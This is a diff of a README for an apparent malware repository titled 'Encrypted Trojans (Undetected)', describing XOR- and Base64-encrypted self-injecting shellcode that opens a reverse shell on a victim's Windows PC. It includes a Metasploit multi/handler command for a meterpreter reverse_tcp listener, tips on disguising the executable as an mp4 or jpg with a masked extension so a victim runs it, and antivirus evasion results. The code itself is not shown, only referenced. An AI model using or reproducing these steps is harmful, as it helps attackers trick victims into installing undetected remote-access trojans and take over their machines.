@@ -1,9 +1,9 @@
 # Encrypted Trojans (Undetected)
-Encrypted self-injection malware that creates a shell on a victim's pc, using Xor and Base64 encryption, UNDETECTED by Windows defender.
+Simple proof of concept of an encrypted self-injection malware that creates a shell on a victim's pc, using Xor and Base64 encryption, undetected by Windows defender.
 
 # 💻 Code (Encryption)
 
-The first code is a very basic xor encryption using python, the second one is c++ based, the third one a base64 encoding based encryption, and the last one is a combination of the previous ones. The shellcodes are released with a very simple self injection process i showed in a previous repo, [Self-Injection-Reverse-Shell-Undetected](https://github.com/Hue-Jhan/Self-Injection-Reverse-Shell-Undetected), therefore i will not explain everything in details.
+The first code is a very basic xor encryption using python, the second one is c++ based, the third one a base64 encoding based encryption, and the last one is a combination of the previous ones. The shellcodes are released with a very simple self injection process i showed in a previous repo, [Self-Injection-Reverse-Shell-Undetected](https://github.com/Hue-Jhan/Self-Injection-Reverse-Shell-Undetected). The encryption processes are explained in detail in a new repo: [simple shellcode crypter](https://github.com/Hue-Jhan/Simple-shellcode-crypter).
 
 ### 1) Python simple xor encryption
 
@@ -23,8 +23,7 @@ Here the shellcode is encrypted using a simple XOR operation, and then it's enco
 
 ### 5) Multiple Xor and Base64 encryptions
 
-The final encryption consists in multiple rounds of the Xor/B64 encryption, its the most complex i made so far. The only problem is decoding and injecting it, i've been having some issues decoding it as the cmd crashes : (
-It's probably related to a buffer overflow due to the size of the encrypted shellcode.
+The last encryption consists in multiple rounds of the Xor/B64 encryption.
 
 ---
 
@@ -40,7 +39,7 @@ Finally we wait for the created thread (which is running the shellcode) to finis
 
 **Listener**:
 
-On the attacker's machine i used the classic multi handler exploit to run the payload: 
+On the attacker's machine i use multi handler exploit to run the payload: 
 
 ``` msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost XXX; set lport XXX; exploit" ```
 
@@ -53,7 +52,7 @@ The payload is, as i said before, a simple base64 shellcode, it's reccomended to
 
 **Shell**
 
-You can embed the code into pretty much anything, you can even use tools to mask the exe file into a mp4 or jpg file, complete with a new icon and a name, even the extension can be masked.
+You can embed the code into pretty much anything, you can use tools to mask the exe file into a mp4 or jpg file, complete with a new icon and a name, the extension can be masked too.
 Once the victim runs the exe, a new session will pop up on meterpreter, and u can view it and use it with:
 
 ``` sessions ``` or ``` shell ```
@@ -64,7 +63,7 @@ Once the victim runs the exe, a new session will pop up on meterpreter, and u ca
 
 <img align="right" src="media/trojan-shigata.png" width="230" />
 
-Currently undetected by windows defender, but it's easily blocked by Bitdefender, even the free trial.
+Undetected by windows defender, but it's easily blocked by Bitdefender, even the free trial.
 Again Virus Total says that bitdefender won't classify the exe file as malicious, while Microsoft recognizes the malware.... it should be the exact opposite but idk.
 
 - Simple python xor: 23 av detections
